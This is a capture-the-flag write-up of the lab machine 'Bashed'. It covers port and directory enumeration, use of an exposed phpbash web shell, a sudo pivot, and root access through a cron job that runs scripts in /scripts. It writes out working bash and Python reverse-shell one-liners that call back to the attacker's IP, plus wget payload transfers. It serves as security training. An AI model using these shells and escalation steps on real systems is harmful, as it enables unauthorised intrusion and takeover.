---
title: Bashed
tags: linux
---

![image](assets/79369383-d8b97280-7f1e-11ea-95e8-354f14929c25.png)

## Overview

Bashed is an Ubuntu box running Apache hosting a custom website/blog. The developer talks about creating something called phpbash. Using gobuster I discovered a number of folders including a site that hosted a web-based shell running as www-data. Using the shell I determined that a cron job was running anything in the scripts folder as root which was exploited to get a root shell.

## Enumeration

**Software**

* Ubuntu 16.04.2 LTS
* Apache 2.4.18

**Open Ports**

```
nmap -vv -Pn -sT -A --osscan-guess -p- 10.10.10.68 -oN /mnt/data/boxes/bashed/_full_tcp_nmap.txt
```

* 80/tcp - http

**URL/File Discovery**

```
gobuster dir -w http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html -t 25
```

![image](assets/79475960-660bce00-7fd6-11ea-82ad-3f296cd9bf12.png)

## Steps (User)

Browsing to http://10.10.10.68 showed a blog entry talking about phpbash which appeared to be a web shell that was created for pentesting. There were no other pages or interesting information in the source code.

Reviewing the gobuster output showed a few interesting results but nothing useful besides /dev. Browsing to /dev showed a directory listing with one of the files being phpbash.php.

![image](assets/79476916-943ddd80-7fd7-11ea-837c-f43669e1abc9.png)

Browsing to http://10.10.10.68/dev/phpbash.php brought me to a page hosting a web-based user shell.

![image](assets/79477267-07475400-7fd8-11ea-9d43-f63bd20e4d3d.png)

One of the first things I do is run sudo -l which lists the allowed commands for the user. The output of this command showed that this account can run any command as user "scriptmanager".

> [sudo](https://linux.die.net/man/8/sudo) allows a permitted user to execute a command as the superuser or another user, as specified by the security policy. 

![image](assets/79497293-6b2c4580-7ff5-11ea-9a4c-ccd7c7a6179b.png)

Attempting to switch to scriptmanager doesn't work on the web shell so to get around this I used netcat to create a reverse shell. The box was running the openbsd version of netcat so there was no -e option, __bash -i >& /dev/tcp/10.10.14.13/4200 0>&1__ and a few other variations of this didn't work. 

I ran 'which python' to confirm that python was installed on the box and grabbed a copy of the python reverse shell from [PentestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). 

I started a netcat listener (nc -l 4200), updated the command with my box's IP/port, and ran it in the web shell.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.32",4200));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![image](assets/86192957-bea03100-bb18-11ea-8010-9be1166be8b6.png)

Now that I had a proper shell I was able to run the command below which executed a bash shell under the context of the scriptmanager user.

```
sudo -u scriptmanager /bin/bash
```

![image](assets/79480129-b2a5d800-7fdb-11ea-918d-b78590dee785.png)

## Steps (root/system)

As I was looking around on the filesystem I noticed an unusual folder /scripts. In this folder there was a file owned by root that, judging by the timestamp (ls -la), was being updated frequently.  I ran pspy to see if there were any automated tasks running. 

> [pspy](https://github.com/DominicBreuker/pspy) is a command line tool designed to snoop on processes without need for root permissions.

I copied pspy32 to my working directory and fired up a python http server so I could transfer the file to the target box. 

```
local: cp ~/tools/pspy/pspy32 .
local: python3 -m http.server 80
```

I then used wget to copy the file to the target.

```
target: wget http://10.10.14.32/pspy32
```

pspy shows that the command that is being run 

```
/bin/sh -c cd /scripts; for f in *.py; do python "$f"; done
```

![image](assets/79482678-24cbec00-7fdf-11ea-8bb5-54d3fae6e8c0.png)

I updated the IP/port in the python code used earlier and started a netcat listener on the matching port (nc -lvnp 4201).

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",4201)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

Using the python http server again, I copied the code to a new file and copied it over to the target box.

```
wget http://10.10.14.32/rshell.py /scripts/rshell.py
chmod +x /scripts/rshell.py
```

Once the script was executed I received a callback on my netcat listener and received a shell as root.

![image](assets/79483164-e420a280-7fdf-11ea-950a-25dc9b8cee38.png)
